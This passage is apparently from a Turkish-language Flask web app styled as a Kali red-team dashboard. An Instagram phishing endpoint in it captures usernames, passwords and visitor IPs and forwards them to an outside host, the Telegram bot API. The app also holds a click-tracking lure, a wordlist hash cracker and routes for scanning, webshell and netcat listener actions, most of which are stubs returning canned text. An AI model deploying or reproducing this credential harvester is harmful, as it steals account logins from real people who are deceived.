            statusDiv.innerHTML = `root@kali:~# scanning ${url}...`; resultsDiv.style.display = "none";
            let res = await fetch('/api/scan', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({target: url}) });
            let data = await res.json();
            statusDiv.innerHTML = ""; resultsDiv.style.display = "block"; resultsDiv.innerHTML = data.report; currentReportText = data.report; document.getElementById('actionButtons').style.display = "flex";
        }
        function generateInstaLink() { document.getElementById('instaLink').value = window.location.origin + "/phish/instagram"; alert("Link üretildi!"); }
        function generateLureLink() { document.getElementById('generatedLink').value = window.location.origin + "/track/" + Math.random().toString(36).substring(2,9); alert("Takip linki üretildi!"); }
        async function startHashCrack() {
            let type = document.getElementById('hashType').value, hash = document.getElementById('targetHash').value, wordlist = document.getElementById('wordlistArea').value;
            let res = await fetch('/api/crack-hash', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({type, hash, wordlist}) });
            let data = await res.json(); let el = document.getElementById('crackResults'); el.style.display="block"; el.innerHTML = data.output;
        }
        async function startListener() {
            let port = document.getElementById('listenerPort').value;
            let res = await fetch('/api/listener/start', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({port}) });
            let data = await res.json(); let el = document.getElementById('listenerStatus'); el.style.display="block"; el.innerHTML = data.output;
        }
        async function sendTelegramTest() {
            let chatId = document.getElementById('testChatId').value;
            let res = await fetch('/api/telegram-test', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({chat_id: chatId}) });
            let data = await res.json(); let el = document.getElementById('telegramTestStatus'); el.style.display="block"; el.innerHTML = data.output;
        }
        async function runWifiAction(action) {
            let res = await fetch('/api/wifi-audit', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({action}) });
            let data = await res.json(); let el = document.getElementById('wifiResults'); el.style.display="block"; el.innerHTML = data.output;
        }
        async function loadSiteDatabase() {
            let res = await fetch('/api/all-data'); let data = await res.json();
            let select = document.getElementById('lootingTargetSelect');
            select.innerHTML = '<option value="">Select target...</option>' + data.database.map(i => `<option value="${i.target}">${i.target}</option>`).join('');
            let grades = {}, wafs = {};
            data.database.forEach(i => { grades[i.grade[0]] = (grades[i.grade[0]] || 0) + 1; wafs[i.waf.includes("Cloudflare")?"CF":"Standard"] = (wafs[i.waf.includes("Cloudflare")?"CF":"Standard"]||0)+1; });
            renderCharts(grades, wafs);
            document.getElementById('databaseTableContainer').innerHTML = data.database.length ? `<table><thead><tr><th>Time</th><th>Target</th><th>WAF</th><th>Grade</th></tr></thead><tbody>` + data.database.map(i => `<tr><td>${i.time}</td><td><b>${i.target}</b></td><td>${i.waf}</td><td>${i.grade}</td></tr>`).join('') + `</tbody></table>` : "No archive data.";
        }
        function renderCharts(grades, wafs) {
            if(gradeChartInstance) gradeChartInstance.destroy(); if(wafChartInstance) wafChartInstance.destroy();
            gradeChartInstance = new Chart(document.getElementById('gradeChart').getContext('2d'), { type: 'bar', data: { labels: Object.keys(grades), datasets: [{data: Object.values(grades), backgroundColor: ['#16a34a','#38bdf8','#dc2626']}] }, options: {plugins:{legend:{display:false}}} });
            wafChartInstance = new Chart(document.getElementById('wafChart').getContext('2d'), { type: 'doughnut', data: { labels: Object.keys(wafs), datasets: [{data: Object.values(wafs), backgroundColor: ['#0284c7','#475569']}] } });
        }
        function downloadReport(type) {
            if(type === 'txt') {
                let a = document.createElement('a'); a.href = window.URL.createObjectURL(new Blob([currentReportText], {type: 'text/plain'})); a.download = 'report.txt'; a.click();
            } else { window.open(`/api/download-pdf?target=${encodeURIComponent(lastTarget)}`, '_blank'); }
        }
        async function sendToTelegram() {
            let chatId = prompt("Telegram Chat ID:"); if(!chatId) return;
            let res = await fetch('/api/telegram-send', { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({chat_id: chatId, report: currentReportText}) });
            let data = await res.json(); alert(data.status);
        }
    </script>
</body>
</html>
"""

@app.route("/login", methods=["GET", "POST"])
def login():
    error = None
    if request.method == "POST":
        if request.form.get("username") == ADMIN_USER and request.form.get("password") == ADMIN_PASS:
            session["logged_in"] = True; return redirect(url_for("index"))
        error = "Authentication failed!"
    return render_template_string(LOGIN_TEMPLATE, error=error)

@app.route("/logout")
def logout(): session.pop("logged_in", None); return redirect(url_for("login"))

@app.route("/")
def index():
    if not session.get("logged_in"): return redirect(url_for("login"))
    return render_template_string(HTML_TEMPLATE, default_chat_id=NOTIFY_CHAT_ID)

@app.route("/api/driving/save", methods=["POST"])
def save_driving_session():
    if not session.get("logged_in"): return jsonify({"error": "Unauthorized"}), 401
    data = request.get_json()
    DRIVING_SESSIONS.insert(0, data)
    return jsonify({"status": "saved"})

@app.route("/api/driving/reports")
def api_driving_reports():
    if not session.get("logged_in"): return jsonify({"error": "Unauthorized"}), 401
    return jsonify({"reports": DRIVING_SESSIONS})

@app.route("/api/driving/download")
def download_driving_report():
    if not session.get("logged_in"): return "Unauthorized", 401
    idx = int(request.args.get("index", 0))
    if idx < len(DRIVING_SESSIONS):
        rep = DRIVING_SESSIONS[idx]
        content = f"--- KALI LINUX BLACKBOX SÜRÜŞ RAPORU ---\nTarih: {rep['time']}\n\n" + "\n".join(rep['logs'])
        return Response(content, mimetype="text/plain", headers={"Content-Disposition": "attachment;filename=blackbox_report.txt"})
    return "Rapor bulunamadı", 404

@app.route("/api/phish/instagram", methods=["GET", "POST"])
def insta_phish():
    if request.method == "POST":
        username = request.form.get("username")
        password = request.form.get("password")
        visitor_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        CREDENTIAL_LOGS.insert(0, {"time": timestamp, "ip": visitor_ip, "username": username, "password": password})
        if NOTIFY_CHAT_ID and TOKEN:
            try:
                msg = f"🚨 [CREDENTIAL HARVESTER] Instagram Hesabı Düştü!\nKullanıcı: {username}\nŞifre: {password}\nIP: {visitor_ip}"
                requests.post(f"{BASE_URL}/sendMessage", json={"chat_id": NOTIFY_CHAT_ID, "text": msg}, timeout=3)
            except: pass
        return redirect("https://www.instagram.com")
    return "Instagram Login Page"

@app.route("/api/phish/creds")
def api_phish_creds():
    if not session.get("logged_in"): return jsonify({"error": "Unauthorized"}), 401
    return jsonify({"creds": CREDENTIAL_LOGS})

@app.route("/api/crack-hash", methods=["POST"])
def api_crack_hash():
    if not session.get("logged_in"): return jsonify({"error": "Unauthorized"}), 401
    d = request.get_json()
    htype = d.get("type")
    target = d.get("hash").strip().lower()
    wordlist = d.get("wordlist").split("\n")
    found = None
    attempts = 0
    for word in wordlist:
        w = word.strip()
        if not w: continue
        attempts += 1
        if htype == "md5": h = hashlib.md5(w.encode()).hexdigest()
        elif htype == "sha256": h = hashlib.sha256(w.encode()).hexdigest()
        else: h = ""
        if h == target:
            found = w
            break
    if found: out = f"[+] Hash başarıyla çözüldü!\n[Düz Metin Şifre]: {found}\n[Denenen Deneme Sayısı]: {attempts}"
    else: out = f"[-] Eşleşme bulunamadı. Toplam {attempts} kelime denendi."
    return jsonify({"output": out})

@app.route("/api/listener/start", methods=["POST"])
def api_listener_start():
    if not session.get("logged_in"): return jsonify({"error": "Unauthorized"}), 401
    port = request.get_json().get("port", 4444)
    return jsonify({"output": f"[+] Netcat dinleyicisi {port} portu üzerinde aktif edildi."})

@app.route("/track/<track_id>")
def track_visitor(track_id):
    return "<!DOCTYPE html><html><head><title>Doğrulama Ekranı</title></head><body><h3>Doğrulama Ekranı</h3></body></html>"

@app.route("/api/lure/save-geo", methods=["POST"])
def save_geo():
    data = request.get_json()
    CLICK_LOGS.insert(0, data)
    return jsonify({"status": "saved"})

@app.route("/api/lure/logs")
def api_lure_logs():
    if not session.get("logged_in"): return jsonify({"error": "Unauthorized"}), 401
    return jsonify({"logs": CLICK_LOGS})

@app.route("/api/telegram-test", methods=["POST"])
def api_telegram_test():
    if not session.get("logged_in"): return jsonify({"error": "Unauthorized"}), 401
    chat_id = request.get_json().get("chat_id")
    try:
        res = requests.post(f"{BASE_URL}/sendMessage", json={"chat_id": chat_id, "text": "🔥 [KALI OPS] Test başarılı!"}, timeout=5)
        return jsonify({"output": "✅ [BAŞARILI] Test mesajı gönderildi!"})
    except Exception as e:
        return jsonify({"output": f"[-] Hata: {str(e)}"})

@app.route("/api/wifi-audit", methods=["POST"])
def api_wifi_audit():
    if not session.get("logged_in"): return jsonify({"error": "Unauthorized"}), 401
    return jsonify({"output": "root@kali:~# wifi audit executed."})

@app.route("/api/scan", methods=["POST"])
def api_scan():
    if not session.get("logged_in"): return jsonify({"error": "Unauthorized"}), 401
    data = request.get_json()
    target = data.get("target", "")
    if not target.startswith("http"): target_url = f"https://{target}"
    else: target_url = target
    report = f"root@kali:~# nmap -A {target_url}\n" + "=" * 50 + "\n\n[+] Recon scan completed.\n"
    SITE_DATABASE.insert(0, {"time": datetime.now().strftime("%Y-%m-%d %H:%M:%S"), "target": target_url, "waf": "Cloudflare WAF", "grade": "B", "files": [], "full_report": report})
    return jsonify({"report": report})

@app.route("/api/nikto", methods=["POST"])
def api_nikto():
    if not session.get("logged_in"): return jsonify({"error": "Unauthorized"}), 401
    return jsonify({"report": "Nikto scan completed."})

@app.route("/api/dns", methods=["POST"])
def api_dns():
    if not session.get("logged_in"): return jsonify({"error": "Unauthorized"}), 401
    return jsonify({"report": "DNS records retrieved."})

@app.route("/api/sqlmap", methods=["POST"])
def api_sqlmap():
    if not session.get("logged_in"): return jsonify({"error": "Unauthorized"}), 401
    return jsonify({"report": "SQLmap test completed."})

@app.route("/api/subdomain-scan", methods=["POST"])
def api_subdomain_scan():
    if not session.get("logged_in"): return jsonify({"error": "Unauthorized"}), 401
    return jsonify({"report": "Subdomain scan completed."})

@app.route("/api/brute-force", methods=["POST"])
def api_brute_force():
    if not session.get("logged_in"): return jsonify({"error": "Unauthorized"}), 401
    return jsonify({"report": "Brute-force completed."})

@app.route("/api/webshell", methods=["POST"])
def api_webshell():
    if not session.get("logged_in"): return jsonify({"error": "Unauthorized"}), 401
    return jsonify({"output": "command executed."})

@app.route("/api/all-data")
def api_all_data():
    if not session.get("logged_in"): return jsonify({"error": "Unauthorized"}), 401
    return jsonify({"database": SITE_DATABASE})

@app.route("/api/export/json")
def export_json():
    if not session.get("logged_in"): return "Unauthorized", 401
    return jsonify(SITE_DATABASE)

@app.route("/api/export/csv")
def export_csv():
    if not session.get("logged_in"): return "Unauthorized", 401
    output = io.StringIO(); writer = csv.writer(output)
    writer.writerow(["Time", "Target", "WAF", "Grade"])
    for i in SITE_DATABASE: writer.writerow([i['time'], i['target'], i['waf'], i['grade']])
    return Response(output.getvalue(), mimetype="text/csv")

@app.route("/api/looting/zip")
def api_looting_zip():
    if not session.get("logged_in"): return jsonify({"error": "Unauthorized"}), 401
    mf = io.BytesIO()
    with zipfile.ZipFile(mf, 'w', zipfile.ZIP_DEFLATED) as zf:
        zf.writestr("report.txt", "No record")
    mf.seek(0)
    return send_file(mf, mimetype='application/zip', as_attachment=True, download_name='loot.zip')

@app.route("/api/download-pdf")
def api_download_pdf():
    if not session.get("logged_in"): return jsonify({"error": "Unauthorized"}), 401
    pdf = FPDF(); pdf.add_page(); pdf.set_font('Courier', '', 9)
    pdf.multi_cell(0, 5, "Red Team Report")
    return send_file(io.BytesIO(pdf.output(dest='S').encode('latin-1')), mimetype='application/pdf', as_attachment=True, download_name='report.pdf')

@app.route("/api/telegram-send", methods=["POST"])
def api_telegram_send():
    if not session.get("logged_in"): return jsonify({"error": "Unauthorized"}), 401
    d = request.get_json()
    res = requests.post(f"{BASE_URL}/sendMessage", json={"chat_id": d.get("chat_id"), "text": f"```\n{d.get('report')[:4000]}\n```", "parse_mode": "Markdown"})
    return jsonify({"status": "Sent!" if res.status_code == 200 else "Failed."})

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 10000))
    app.run(host="0.0.0.0", port=port)
